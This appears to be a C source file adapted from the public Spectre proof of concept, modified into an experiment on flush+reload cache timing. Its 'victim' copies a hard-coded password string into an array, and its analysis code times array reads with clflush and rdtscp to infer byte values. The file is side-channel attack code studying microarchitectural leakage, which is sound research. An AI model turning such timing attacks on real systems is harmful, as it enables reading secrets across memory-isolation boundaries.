/* Compile with "gcc -O0 -std=gnu99" */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] __attribute__ ((aligned (4096))) = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

// does it make an assumption on the size of a cache line?
// potentially 256 bytes in size, so 512 cache lines
uint8_t unused2[64];
uint8_t array2[256 * 512];

uint8_t unused3[64];
uint8_t array3[160] __attribute__ ((aligned (4096))) = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};


char *secret = "The password is rootkea";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */


// nothing fancy. load value into array1
void victim_function(size_t x) {
	array1[x] = secret[x];
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {

  static int results[256];                // histogram
	int tries, i, j, k, mix_i, junk = 0;    // junk used for timing
  // size_t training_x, x; 								// used for training predictor
  register uint64_t time1, time2;
  volatile uint8_t *addr;  								// address to access and use for time

  for (i = 0; i < 256; i++)
    results[i] = 0; 											// static array. re-initialize?

	// run the experiment
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    /* intrinsic for clflush instruction */
    for (i = 0; i < 256; i++) {

			// flush cache line containing array2[i * 512]
			// won't contain other array2[j * 512]?  
      _mm_clflush(&array2[i * 512]);
    }

		// attack!!!!!!
		victim_function(malicious_x);

		// squash zone
		uint8_t fake_secret = array3[malicious_x];
		temp &= array2[fake_secret * 512];

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];

			// get reference time
      time1 = __rdtscp(&junk);         /* READ TIMER */

			// time the access to each array2[i * 512]
      junk = *addr;                    /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

			// if short enough 'cache hit' after we flushed all of array2's elements
			// add to histogram
      if (time2 <= CACHE_HIT_THRESHOLD &&
          mix_i != array3[tries % array1_size]) {
        results[mix_i]++; /* cache hit - add +1 to score for this value */
      }
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }

    /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    if (results[j] >= (2 * results[k] + 5) ||
       (results[j] == 2 && results[k] == 0)) {
      break;
    }
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out */
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x = 0;
  //size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
  int i, score[2], len = 23;
  uint8_t value[2];

  /* write to array2 so in RAM not copy-on-write zero pages */
  for (i = 0; i < sizeof(array2); i++) {
    array2[i] = 1;
  }

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);

    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", 
					 value[0], 
					 (value[0] > 31 && value[0] < 127 ? value[0] : '?'),
					 score[0]
					);

    if (score[1] > 0) {
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    }
    printf("\n");
  }
  return (0);
}
